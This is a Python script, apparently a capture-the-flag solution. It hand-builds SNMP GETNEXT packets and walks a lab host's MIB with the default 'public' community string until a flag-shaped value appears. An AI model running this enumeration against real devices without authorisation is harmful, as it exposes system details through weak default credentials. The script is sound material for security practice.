import socket
import re

TARGET_IP = "10.110.3.72"
TARGET_PORT = 8024
COMMUNITY = b"public"
START_OID = "1.3.6.1.2.1.1.1.0"
MAX_ITER = 200

def encode_oid(oid_str):
    parts = [int(x) for x in oid_str.split('.')]
    out = bytearray([40 * parts[0] + parts[1]])
    for num in parts[2:]:
        if num < 128:
            out.append(num)
        else:
            stack = []
            while num:
                stack.append(num & 0x7F); num >>= 7
            stack.reverse()
            for i, b in enumerate(stack):
                out.append(b | 0x80 if i < len(stack) - 1 else b)
    return bytes(out)

def encode_len(n):
    if n < 128: return bytes([n])
    b = []
    while n:
        b.append(n & 0xFF); n >>= 8
    b.reverse()
    return bytes([0x80 | len(b)]) + bytes(b)

def tlv(tag, content):
    return bytes([tag]) + encode_len(len(content)) + content

def build_getnext(oid_str, req_id):
    varbind = tlv(0x30, tlv(0x06, encode_oid(oid_str)) + tlv(0x05, b''))
    pdu_body = (tlv(0x02, bytes([req_id & 0xFF])) + tlv(0x02, b'\x00')
                + tlv(0x02, b'\x00') + tlv(0x30, varbind))
    pdu = tlv(0xA1, pdu_body)
    return tlv(0x30, tlv(0x02, b'\x01') + tlv(0x04, COMMUNITY) + pdu)

def decode_oid(b):
    if not b: return ''
    parts = [b[0] // 40, b[0] % 40]; i = 1
    while i < len(b):
        val = 0
        while i < len(b) and b[i] & 0x80:
            val = (val << 7) | (b[i] & 0x7F); i += 1
        if i >= len(b): break
        val = (val << 7) | b[i]; i += 1
        parts.append(val)
    return '.'.join(map(str, parts))

def parse_tlvs(data, start=0, end=None):
    if end is None: end = len(data)
    result = []
    pos = start
    while pos + 1 < end:
        tag = data[pos]; pos += 1
        ln = data[pos]; pos += 1
        if ln & 0x80:
            n = ln & 0x7F; ln = 0
            for _ in range(n):
                if pos >= end: return result
                ln = (ln << 8) | data[pos]; pos += 1
        content_end = pos + ln
        if content_end > end: return result
        result.append((tag, data[pos:content_end], pos, content_end))
        pos = content_end
    return result

def get_varbind(data):
    top = parse_tlvs(data)
    if not top or top[0][0] != 0x30: return None, None, None
    parts = parse_tlvs(data, top[0][2], top[0][3])
    pdu = next(((cs, ce) for t, c, cs, ce in parts if t in (0xA2, 0xA3)), None)
    if not pdu: return None, None, None
    pdu_parts = parse_tlvs(data, pdu[0], pdu[1])
    vblist = next(((cs, ce) for t, c, cs, ce in pdu_parts if t == 0x30), None)
    if not vblist: return None, None, None
    vblist_parts = parse_tlvs(data, vblist[0], vblist[1])
    if not vblist_parts: return None, None, None
    vb = vblist_parts[0]
    if vb[0] != 0x30: return None, None, None
    vb_parts = parse_tlvs(data, vb[2], vb[3])
    if len(vb_parts) < 2: return None, None, None
    oid_t, oid_c = vb_parts[0][0], vb_parts[0][1]
    val_t, val_c = vb_parts[1][0], vb_parts[1][1]
    if oid_t != 0x06: return None, None, None
    oid_str = decode_oid(oid_c)
    if val_t == 0x04:
        value = val_c.decode('latin-1', errors='replace')
    elif val_t == 0x82: value = '<endOfMibView>'
    elif val_t == 0x80: value = '<noSuchObject>'
    elif val_t == 0x81: value = '<noSuchInstance>'
    else: value = f'<tag 0x{val_t:02x}> ' + val_c.hex()
    return oid_str, value, val_t

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3.0)
    oid, req_id = START_OID, 1
    seen = set()
    print(f"[*] GETNEXT walk from {START_OID}")
    for _ in range(MAX_ITER):
        try:
            sock.sendto(build_getnext(oid, req_id), (TARGET_IP, TARGET_PORT))
            data, _ = sock.recvfrom(65535)
        except socket.timeout:
            print("[-] Timeout"); break
        next_oid, value, val_tag = get_varbind(data)
        if not next_oid:
            print("[*] Failed to parse response"); break
        if val_tag == 0x82:
            print(f"{next_oid} = <endOfMibView>")
            break
        if next_oid in seen:
            print(f"[*] OID repeated — walk complete at {next_oid}"); break
        seen.add(next_oid)
        print(f"{next_oid} = {value}")
        m = re.search(r'(?:flag|ctf|deti)\{[^}]+\}', value or '', re.IGNORECASE)
        if m:
            print(f"\n[!] FLAG: {m.group(0)}"); break
        oid = next_oid; req_id += 1
    sock.close()

if __name__ == "__main__":
    main()
